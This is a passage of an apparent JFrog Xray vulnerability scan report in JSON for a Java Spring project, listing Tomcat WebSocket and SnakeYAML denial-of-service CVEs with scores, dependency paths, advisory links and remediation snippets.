[
  {
    "scan_id": "b715e809-37df-4fc3-8515-1adbe25cef96",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2024-23672",
            "cvss_v3_score": "6.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "cwe": [
              "CWE-459"
            ]
          }
        ],
        "summary": "Denial of Service via incomplete cleanup vulnerability in Apache Tomcat. It was possible for WebSocket clients to keep WebSocket connections open leading to increased resource consumption.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M16, from 10.1.0-M1 through 10.1.18, from 9.0.0-M1 through 9.0.85, from 8.5.0 through 8.5.98.\n\nOlder, EOL versions may also be affected.\n\n\nUsers are recommended to upgrade to version 11.0.0-M17, 10.1.19, 9.0.86 or 8.5.99 which fix the issue.",
        "severity": "Medium",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83": {
            "fixed_versions": [
              "[10.1.19]",
              "[11.0.0-M17]",
              "[8.5.99]",
              "[9.0.86]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-593657",
        "references": [
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3UWIS5MMGYDZBLJYT674ZI5AWFHDZ46B",
          "https://github.com/advisories/GHSA-v682-8vv8-vpwr",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3UWIS5MMGYDZBLJYT674ZI5AWFHDZ46B/",
          "https://lists.debian.org/debian-lts-announce/2024/04/msg00001.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-23672",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/736G4GPZWS2DSQO5WKXO3G6OMZKFEK55",
          "https://github.com/apache/tomcat/commit/52d6650e062d880704898d7d8c1b2b7a3efe8068",
          "http://www.openwall.com/lists/oss-security/2024/03/13/4",
          "https://github.com/apache/tomcat/commit/b0e3b1bd78de270d53e319d7cb79eb282aa53cb9",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/736G4GPZWS2DSQO5WKXO3G6OMZKFEK55/",
          "https://lists.apache.org/thread/cmpswfx6tj4s7x0nxxosvfqs11lvdx2f",
          "https://security.netapp.com/advisory/ntap-20240402-0002",
          "https://github.com/apache/tomcat/commit/3631adb1342d8bbd8598802a12b63ad02c37d591",
          "https://github.com/apache/tomcat/commit/0052b374684b613b0c849899b325ebe334ac6501",
          "https://security.netapp.com/advisory/ntap-20240402-0002/"
        ],
        "extended_information": {
          "short_description": "A design problem in Apache Tomcat may lead to a denial of service when using the WebSockets suspend feature.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\n`WebSockets` provide a bidirectional communication channel over a single long-lived TCP connection. Unlike traditional HTTP connections, which are typically request-response based, `WebSockets` enable real-time communication between a client and a server. This allows for more interactive and dynamic web applications where data can be pushed from the server to the client and vice versa without the need for constant polling.\n\nThe suspend/resume feature in `Apache Tomcat` is designed to help servers and clients communicate better by limiting the amount of incoming messages.\n\nA flaw in the `WsSession` (a Websocket session) suspend/resume feature in Tomcat has been found that allows an attacker to create a Websocket without closing it on the server. This may lead to excessive resource consumption and therefore denial of service.\n\nThe flaw is the lack of session timeout, which means that a Websocket Session could be left open for an unlimited amount of time. By creating enough WebSockets that will consume enough resources, attackers may crash the server.\n\nNote: To exploit this CVE the server must use the `suspend`/`resume` feature. In all other cases, if the session remains idle the session will automatically close due to the idle-timeout property.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The server must use the `session`/`suspend` feature to be vulnerable, which is highly unlikely to be used.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker will need to connect enough WebSockets to the server."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Denial of service."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-25857",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-776",
              "CWE-400"
            ]
          }
        ],
        "summary": "The package org.yaml:snakeyaml from 0 and before 1.31 are vulnerable to Denial of Service (DoS) due missing to nested depth limitation for collections.",
        "severity": "High",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253124",
        "references": [
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-25857",
          "https://github.com/advisories/GHSA-3mc7-4q67-w48m",
          "https://security.snyk.io/vuln/SNYK-JAVA-ORGYAML-2806360",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/525",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html"
        ],
        "extended_information": {
          "short_description": "Improper limitation of nesting depth in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing many nested keys can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38752",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ]
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack-overflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.32]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253427",
        "references": [
          "https://github.com/advisories/GHSA-9w3m-gqgf-c4p9",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38752",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081",
          "https://security.netapp.com/advisory/ntap-20240315-0009/",
          "https://security.gentoo.org/glsa/202305-28",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081",
          "https://security.netapp.com/advisory/ntap-20240315-0009"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a short regular expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38751",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ]
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253428",
        "references": [
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039",
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://github.com/advisories/GHSA-98wm-3w3q-mw94",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38751",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://bitbucket.org/snakeyaml/snakeyaml/src/master/src/test/java/org/yaml/snakeyaml/issues/issue530/Fuzzy47039Test.java",
          "https://security.gentoo.org/glsa/202305-28",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing an extremely long regular expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA PoC was published [here](PoC demonstrates denial of service)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38749",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ]
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253430",
        "references": [
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open",
          "https://github.com/advisories/GHSA-c4r9-r8fh-9vj2",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-38749",
          "https://security.gentoo.org/glsa/202305-28",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47024",
          "https://arxiv.org/pdf/2306.05534.pdf",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html",
          "https://security.netapp.com/advisory/ntap-20240315-0010"
        ],
        "extended_information": {
          "short_description": "Stack exhaustion in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a deeply nested expression can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\nA crashing PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-38750",
            "cvss_v3_score": "5.5",
            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-121",
              "CWE-787"
            ]
          }
        ],
        "summary": "Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.",
        "severity": "Medium",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
